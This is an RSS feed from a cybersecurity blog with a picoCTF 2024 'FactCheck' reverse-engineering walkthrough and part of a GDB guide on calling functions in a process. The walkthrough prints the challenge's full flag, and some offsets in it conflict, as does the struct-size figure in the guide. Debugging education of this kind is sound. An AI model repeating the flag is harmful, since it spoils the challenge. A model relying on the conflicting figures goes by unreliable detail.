<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Mathscantor&#39;s Cybersecurity Blog</title>
        <link>https://mathscantor.github.io/posts/</link>
        <description>Recent content in Posts on Mathscantor&#39;s Cybersecurity Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 01 Aug 2025 09:53:25 +0800</lastBuildDate>
        <atom:link href="https://mathscantor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>picoCTF 2024 - FactCheck Walkthrough</title>
            <link>https://mathscantor.github.io/posts/picoctf/2024/factcheck/</link>
            <pubDate>Fri, 01 Aug 2025 09:53:25 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/picoctf/2024/factcheck/</guid>
            <description>&lt;h2 id=&#34;1-preparation&#34;&gt;1. Preparation&lt;/h2&gt;
&lt;p&gt;Before we begin the walkthrough, please ensure to have the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The &lt;a href=&#34;https://artifacts.picoctf.net/c_titan/187/bin&#34;&gt;binary&lt;/a&gt; challenge&lt;/li&gt;
&lt;li&gt;Ghidra or IDA for static analysis&lt;/li&gt;
&lt;li&gt;GDB for dynamic analysis&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2-static-analysis-in-ghidra&#34;&gt;2. Static Analysis in Ghidra&lt;/h2&gt;
&lt;p&gt;To objectively narrow down the scope, we can cheat a little by searching for &amp;ldquo;picoCTF&amp;rdquo; strings in the binary.&lt;/p&gt;
&lt;p&gt;&lt;img class=&#34;center&#34; alt=&#34;ghidra-flag-strings&#34; src=&#34;https://mathscantor.github.io/posts/picoctf/2024/factcheck/images/ghidra-flag-strings.png&#34;&gt;&lt;br&gt;
&lt;link href=&#34;https://mathscantor.github.io/posts/css/caption.css&#34; rel=&#34;stylesheet&#34;&gt;
&lt;span class=&#34;caption&#34; data-type=&#34;figure&#34;&gt;Flag Substring Search&lt;br&gt;&lt;br&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;From the figure above, Ghidra suggests that the string is found at &lt;code&gt;0x00102005&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Clicking on it leads us to where the string was defined. However, you will notice that the flag is incomplete, and it is referenced in &lt;em&gt;main()&lt;/em&gt;.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-preparation">1. Preparation</h2>
<p>Before we begin the walkthrough, please ensure to have the following:</p>
<ol>
<li>The <a href="https://artifacts.picoctf.net/c_titan/187/bin">binary</a> challenge</li>
<li>Ghidra or IDA for static analysis</li>
<li>GDB for dynamic analysis</li>
</ol>
<h2 id="2-static-analysis-in-ghidra">2. Static Analysis in Ghidra</h2>
<p>To objectively narrow down the scope, we can cheat a little by searching for &ldquo;picoCTF&rdquo; strings in the binary.</p>
<p><img class="center" alt="ghidra-flag-strings" src="/posts/picoctf/2024/factcheck/images/ghidra-flag-strings.png"><br>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="figure">Flag Substring Search<br><br></span></p>
<p>From the figure above, Ghidra suggests that the string is found at <code>0x00102005</code>.</p>
<p>Clicking on it leads us to where the string was defined. However, you will notice that the flag is incomplete, and it is referenced in <em>main()</em>.</p>
<p><img class="center" alt="ghidra-flag-strings" src="/posts/picoCTF/2024/factcheck/images/ghidra-string-definition-offset.png"><br>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="figure">Flag Suffix Definition<br><br></span></p>
<p>Again, click on the reference address, and it will bring us to <em>main()</em>.</p>
<p><img class="center" alt="ghidra-flag-strings" src="/posts/picoCTF/2024/factcheck/images/partial-flag-reference-in-main.png"><br>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="figure">Partial Flag Reference in <em>main()</em><br><br></span></p>
<p>Looking at the decompiled code, the first part of the flag is assigned to the <code>local_248</code>, which is a pointer to memory in heap, where the constructed string will be placed. Subsequently, other strings are defined as well. (See Listing 1)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) { 
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span>string(local_248,<span style="color:#e6db74">&#34;picoCTF{wELF_d0N3_mate_&#34;</span>,<span style="color:#f92672">&amp;</span>local_249);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span>string(local_228,<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#f92672">&amp;</span>local_249)
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span>string(local_208,<span style="color:#e6db74">&#34;5&#34;</span>,<span style="color:#f92672">&amp;</span>local_249);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Strings Initialization<br><br></span>
<p>After initializing a bunch of strings, it proceeds to append the other defined strings to the flag through a bunch of checks.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) { 
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>pcVar2 <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;B&#39;</span>) {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">+=</span>(local_248,local_c8);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  pcVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span>[]((ulong)local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>pcVar2 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;A&#39;</span>) {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">+=</span>(local_248,local_68);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)cVar1 <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>pcVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">+=</span>(local_248,local_1c8);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Flag&#39;s ending tag is appended
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  std<span style="color:#f92672">::</span>__cxx11<span style="color:#f92672">::</span>string<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">+=</span>(local_248,<span style="color:#e6db74">&#39;}&#39;</span>);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Truncated: Calls to string deconstructor
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Flag Construction<br><br></span>
<p>There are a few things we need to figure out before proceeding to dynamic analysis with GDB:</p>
<ol>
<li>What is the base address of <em>main()</em>?
<pre tabindex="0"><code class="language-answer" data-lang="answer">0x00101289
</code></pre></li>
<li>Which instruction appends the flag&rsquo;s ending tag?
<pre tabindex="0"><code class="language-answer" data-lang="answer">0010185b e8 a0 f8        CALL       &lt;EXTERNAL&gt;::std::__cxx11::string::operator+=
          ff ff
</code></pre></li>
<li>What is that instruction&rsquo;s offset from <em>main()</em>?
<pre tabindex="0"><code class="language-answer" data-lang="answer">&gt;&gt;&gt; hex(0x0010185b - 0x00101289)
0x5d2
</code></pre></li>
</ol>
<h2 id="3-dynamic-analysis-in-gdb">3. Dynamic Analysis in GDB</h2>
<h3 id="31-method-1---stepping-over-last-string-concat">3.1 Method 1 - Stepping Over Last String Concat</h3>
<p>Start GDB by loading the binary and break on <code>main() + 0x5d2</code>, before running the binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ./bin
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set pag off
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set disassembly-flavor intel
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set output-radix <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b *<span style="color:#f92672">(</span>main + 0x5d2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting Breakpoint &amp; Run<br><br></span>
<p>Once our breakpoint is hit, ensure that we really are at the correct instruction by listing 3 instructions before RIP and 6 instructions after RIP.
<link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert tip">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Tip</strong>
        </div>
        <div class="alert-body"><code>$pc</code> is an alias for <code>$rip</code></div>
    </div>
</div>
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Breakpoint 1, 0x000055555555585b in main <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/10i $pc-15
</span></span><span style="display:flex;"><span>   0x55555555584c &lt;main+1475&gt;:  lea    rax,<span style="color:#f92672">[</span>rbp-0x240<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x555555555853 &lt;main+1482&gt;:  mov    esi,0x7d
</span></span><span style="display:flex;"><span>   0x555555555858 &lt;main+1487&gt;:  mov    rdi,rax
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x55555555585b &lt;main+1490&gt;:  call   0x555555555100 &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEc@plt&gt;
</span></span><span style="display:flex;"><span>   0x555555555860 &lt;main+1495&gt;:  mov    ebx,0x0
</span></span><span style="display:flex;"><span>   0x555555555865 &lt;main+1500&gt;:  lea    rax,<span style="color:#f92672">[</span>rbp-0x40<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x555555555869 &lt;main+1504&gt;:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   0x55555555586c &lt;main+1507&gt;:  call   0x5555555550f0 &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@plt&gt;
</span></span><span style="display:flex;"><span>   0x555555555871 &lt;main+1512&gt;:  lea    rax,<span style="color:#f92672">[</span>rbp-0x60<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x555555555875 &lt;main+1516&gt;:  mov    rdi,rax
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Checking Instructions<br><br></span>
<p>Looking at the listing above, the flag pointer is stored in RDI just before the call. We can verify this by examining the string that is pointed to by the address in RDI.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/gx $rdi
</span></span><span style="display:flex;"><span>0x7fffffffd530: 0x000055555556b2d0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s 0x000055555556b2d0
</span></span><span style="display:flex;"><span>0x55555556b2d0: <span style="color:#e6db74">&#34;picoCTF{wELF_d0N3_mate_e9da2c0e&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># For convenience we store this address into a variable</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $flag <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>unsigned long long<span style="color:#f92672">}</span>$rdi
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Getting Address of Flag<br><br></span>
<p>For completeness, step over this call and print the flag again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> ni
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s $flag
</span></span><span style="display:flex;"><span>0x55555556b2d0: <span style="color:#e6db74">&#34;picoCTF{wELF_d0N3_mate_e9da2c0e}&#34;</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Flag<br><br></span>
<h3 id="32-method-2---lazy-heap-memory-search">3.2 Method 2 - Lazy Heap Memory Search</h3>
<p>If you are rather lazy and just want to get the flag before it is freed, you can set a breakpoint at the <code>ret</code> instruction. This happens to be at <code>main+0x9ca</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b *<span style="color:#f92672">(</span>main + 1504<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Break At RET Instruction<br><br></span>
<p>When the breakpoint hits, identify where the start and end of the heap is.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info proc mappings
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x0000555555559000 0x000055555557a000 0x21000            0x0                rw-p  <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $heap_start <span style="color:#f92672">=</span> 0x0000555555559000
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $heap_end <span style="color:#f92672">=</span> 0x000055555557a000 - <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Get Start and End of Heap Memory Region<br><br></span>
<p>We are now able to search through the heap for the substring &ldquo;pico&rdquo; to get its address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> find /b $heap_start, $heap_end, <span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#e6db74">&#39;i&#39;</span>, <span style="color:#e6db74">&#39;c&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>
</span></span><span style="display:flex;"><span>0x55555556b2d0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> pattern found.
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Finding Address of Flag<br><br></span>
<p>As only 1 pattern is found, this becomes straightforward by examining the buffer stored in that address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s 0x55555556b2d0
</span></span><span style="display:flex;"><span>0x55555556b2d0: <span style="color:#e6db74">&#34;picoCTF{wELF_d0N3_mate_e9da2c0e}&#34;</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Flag<br><br></span>
<h2 id="4-resources">4. Resources</h2>
<ul>
<li><a href="/posts/picoctf/2024/factcheck/resources/solution.gdb">solution.gdb</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>GDB Guide Part 8 - Invoking Function Calls</title>
            <link>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part8-invoking-function-calls/</link>
            <pubDate>Sun, 20 Jul 2025 12:34:19 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part8-invoking-function-calls/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;It&amp;rsquo;s been quite a while hasn&amp;rsquo;t it? I hope you have been doing well and taking care of yourself. I recently had some junior colleagues asking me how it is possible to directly invoke certain functions while using GDB. Thus, I thought it would be a great opportunity to share some useful tips.&lt;/p&gt;
&lt;p&gt;We will be looking at how to invoke different functions of different return types using a simple example: &lt;a href=&#34;https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part8-invoking-function-calls/resources/gdb_invoke_function.c&#34;&gt;gdb_invoke_function.c&lt;/a&gt;&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>It&rsquo;s been quite a while hasn&rsquo;t it? I hope you have been doing well and taking care of yourself. I recently had some junior colleagues asking me how it is possible to directly invoke certain functions while using GDB. Thus, I thought it would be a great opportunity to share some useful tips.</p>
<p>We will be looking at how to invoke different functions of different return types using a simple example: <a href="/posts/gdb-guides/gdb-guide-part8-invoking-function-calls/resources/gdb_invoke_function.c">gdb_invoke_function.c</a></p>
<p>Let&rsquo;s get started!</p>
<h2 id="2-syntax">2. Syntax</h2>
<p>When invoking functions manually in GDB, you have full control over function calls just like in C. You have to explicitly cast the function return type when invoking any function call. Optionally, you can also cast a type to the argument.</p>
<p>To call a function, use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>call <span style="color:#f92672">(</span>return_type<span style="color:#f92672">)</span><span style="color:#66d9ef">function</span><span style="color:#f92672">((</span>arg_type<span style="color:#f92672">)</span>arg1, <span style="color:#f92672">(</span>arg_type<span style="color:#f92672">)</span>arg2, ...<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example: </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># └── call (int)add((int)$arg1, (int)$arg2)</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Syntax for Invoking Function Call<br><br></span>
<p>If the function returns a value and you want to store it in a GDB variable for later use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set $ret_val <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>return_type<span style="color:#f92672">)</span><span style="color:#66d9ef">function</span><span style="color:#f92672">((</span>arg_type<span style="color:#f92672">)</span>arg1, <span style="color:#f92672">(</span>arg_type<span style="color:#f92672">)</span>arg2, ...<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example: </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># └── set $ret = (int)add((int)$arg1, (int)$arg2)</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Assigning Return Value to GDB Variable<br><br></span>
<p>For cases where the function symbol is stripped, we can also directly invoke the function call through the known function address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>call <span style="color:#f92672">(</span>return_type<span style="color:#f92672">)</span>function_addr<span style="color:#f92672">((</span>arg_type<span style="color:#f92672">)</span>arg1, <span style="color:#f92672">(</span>arg_type<span style="color:#f92672">)</span>arg2, ...<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example: </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># └── call (int)0x4004bc((int)$arg1, (int)$arg2)</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Invoking Function Call Through Known Address<br><br></span>
<h2 id="3-examples">3. Examples</h2>
<p>This section of the guide will solely reference <a href="/posts/gdb-guides/gdb-guide-part8-invoking-function-calls/resources/gdb_invoke_function.c">gdb_invoke_function.c</a>.</p>
<h3 id="31-no-arguments">3.1 No Arguments</h3>
<p>For a start, let&rsquo;s invoke the <em>do_nothing()</em> function which takes in no arguments and does not return anything.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>do_nothing<span style="color:#f92672">()</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Calling <em>do_nothing()</em> Function<br><br></span>
<h3 id="32-one-argument">3.2 One Argument</h3>
<p>Next, we can invoke the <i>hello(const char *name)</i> function which takes in a string as its only argument.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>hello<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Gerald&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Calling <i>hello(const char *name)</i> Function<br><br></span>
<h3 id="33-two-arguments">3.3 Two Arguments</h3>
<p>Similarly, we can do the same for invoking the <i>add(int a, int b)</i> function which takes in 2 integers and returns the sum.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $sum <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>int<span style="color:#f92672">)</span>add<span style="color:#f92672">(</span>24, 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p $sum
</span></span><span style="display:flex;"><span>$1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">34</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Calling <i>add(int a, int b)</i> Function<br><br></span>
<h3 id="34-struct-arguments">3.4 Struct Arguments</h3>
<p>GDB is not just limited to primitive types. You can also pass struct pointers into functions, even in stripped binaries or cases where you no longer have symbol/type information.</p>
<p>In our example, we want to invoke <i>get_person_name(person_t *person)</i>, which returns a pointer to the name field of a <em>person_t</em> struct.</p>
<p>Since GDB doesn’t know about <em>person_t</em> as a type (especially in stripped binaries), we can manually construct the struct in memory by calculating offsets from static analysis or DWARF debug info.</p>
<p>Taking a look at the definition of the <em>person_t</em> struct, we can manually calculate the size of the struct, which ends up being 259 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> id;          <span style="color:#75715e">// 2 Bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">256</span>];       <span style="color:#75715e">// 256 Bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span> is_deceased;  <span style="color:#75715e">// 1 Byte
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">person_t</span>;               <span style="color:#75715e">/* Total: 259 Bytes */</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Definition of <em>person_t</em><br><br></span>
<p>Thus, we allocate 259 bytes in the heap and assign the return address to a variable to store the pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $person <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>uint64_t<span style="color:#f92672">)</span>malloc<span style="color:#f92672">(</span>259<span style="color:#f92672">)</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Allocating 259 Bytes in Heap<br><br></span>
<p>Next, we populate the struct fields one by one.
Set the <em>id</em> field (offset 0x0):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set *<span style="color:#f92672">(</span>uint16_t *<span style="color:#f92672">)</span>$person <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting <em>id</em> Field at Offset 0x0<br><br></span>
<p>Set the <em>name</em> field (offset 0x2):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>strcpy<span style="color:#f92672">((</span>char *<span style="color:#f92672">)(</span>$person + 0x2<span style="color:#f92672">)</span>, <span style="color:#e6db74">&#34;Gerald&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># OR</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>int<span style="color:#f92672">)</span>snprintf<span style="color:#f92672">((</span>char *<span style="color:#f92672">)(</span>$person + 0x2<span style="color:#f92672">)</span>, 256, <span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#e6db74">&#34;Gerald&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting <em>name</em> Field at Offset 0x2<br><br></span>
<p>Set the <em>is_deceased</em> field (offset 0x102):</p>
